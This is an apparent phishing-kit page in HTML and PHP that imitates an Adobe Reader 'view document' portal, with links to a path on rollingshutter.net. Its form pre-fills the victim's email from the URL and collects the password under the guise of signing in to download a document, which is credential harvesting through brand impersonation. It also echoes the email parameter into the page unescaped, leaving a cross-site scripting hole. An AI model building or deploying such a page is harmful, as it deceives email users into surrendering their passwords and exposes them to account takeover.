...
<link rel="shortcut icon" href="adobe_logo_new_1.jpg" type="image/gif"></head>

<body>
<div style="background-color:rgba(0, 0, 0, 0.5); height:740px;">
<div class="HeaderBox">
  <div align="right">p<a target="_blank" href="https://get.adobe.com/reader/">
  <img src="Acrobat_Reader.fw.png" width="158" height="39" longdesc="">   </a></div>
  <div class="clear2"></div></div>
<div class="NavBox">
<a href="https://www.rollingshutter.net/Uploads/spec/?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>#" class="NavButton">Exit</a>
<a href="https://www.rollingshutter.net/Uploads/spec/?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>#" class="NavButton">Download Document</a>
<form><a href="https://www.rollingshutter.net/Uploads/spec/?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>#" class="NavButton">Print</a> </form>

<a href="https://www.rollingshutter.net/Uploads/spec/?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>#" class="NavButton">Sign In</a>
...
<script src="SpryValidationTextField.js" type="text/javascript"></script>
  ...
  <form autocomplete="off" method="post" action="./?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" name="submit">
  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
    <tbody><tr valign="baseline">
      <td class="texthinter" align="left" height="57" nowrap="nowrap" valign="top" width="71%"><label for="repl_id1"><strong>Email ID:</strong></label>
        ...
        <input autocomplete="off" name="email" class="textFieldlog" id="email" placeholder="Enter Email Address" value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" type="text" readonly=""> 
      ...
      <td rowspan="2" class="texthinter" align="right" nowrap="nowrap" valign="middle" width="29%"><img src="secure.png" height="108" width="108"></td>
    </tr>
    <tr valign="top">
      <td class="texthinter" align="left" nowrap="nowrap">
        ...
        <input autocomplete="off" name="password" class="textFieldlog" id="pswrd" value="" size="32" placeholder="Enter Your Password" type="password">
...
<div class="logo1"><img src="adobe_logo_new_1.jpg" width="110"></div>
<div class="copyright">Copyright 
	...
	©</span> 2017 Adobe Systems Incorporated. All rights reserved.</div></div>
